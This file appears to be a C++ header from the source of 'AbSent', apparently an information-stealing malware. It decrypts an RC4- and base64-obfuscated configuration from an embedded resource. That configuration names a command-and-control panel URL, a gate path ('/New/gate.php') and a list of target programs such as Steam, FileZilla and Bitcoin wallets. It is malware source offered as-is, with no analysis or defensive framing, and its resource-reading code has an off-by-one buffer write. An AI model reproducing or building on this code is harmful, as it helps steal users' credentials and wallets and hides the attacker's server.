#pragma once
#include "AbSent\crypto\base64.h"
#include "AbSent\crypto\rc4.h"

std::string key(int seed)
{
	srand(seed);
	int length = 32;
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	std::string str(length, 0);
	std::generate_n(str.begin(), length, randchar);
	return str;
}

namespace absent
{
	namespace config
	{
		class config
		{
		public:
			std::string panelURL;
			std::string gatePATH;
			std::string buildNAME;
			int reportInt;

			std::string type = "Full";
			std::string versionID = "0.0.1";

			std::string encryptionKey;
			std::list<std::string> programNeedles = {
				"Steam",
				"Skype",
				"Visual Studio",
				"FileZilla",
				"Python",
				"Minecraft",
				"Java",
				"Bitcoin"
			};


			config(std::string ek, std::string pu, std::string gp, std::string bn, int ri, std::list<std::string> pn)
			{
				encryptionKey = ek;
				panelURL = pu;
				gatePATH = gp;
				buildNAME = bn;
				reportInt = ri;
				for (auto n : pn) { programNeedles.push_back(n); }
			}
		};

		config load()
		{
			absent::crypto::RC4 rc4;
			HMODULE hModule = GetModuleHandle(NULL);
			HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(10), RT_RCDATA);
			HGLOBAL hMemory = LoadResource(hModule, hResource);
			DWORD dwSize = SizeofResource(hModule, hResource);
			LPVOID lpAddress = LockResource(hMemory);
			char *bytes = new char[dwSize];
			memset(bytes, 0x00, dwSize + 1);
			memcpy(bytes, lpAddress, dwSize);

			if (strlen(bytes) > 0)
			{
				std::string de_config = rc4.crypt(absent::crypto::b64::decode(bytes), key(0x4d930cf57cfda1ba));
				nlohmann::json j_config = nlohmann::json::parse(de_config);
				std::string ek = j_config["ek"];
				std::string pu = j_config["pu"];
				std::string gp = j_config["gp"];
				std::string bn = j_config["bn"];
				int ri = j_config["ri"];
				std::list<std::string> pn = j_config["pn"];

				return config(ek, pu, gp, bn, ri, pn);
			}
			return config("AAAA", "server.com", "/New/gate.php", "Test", 5, {});
		}
	}
}

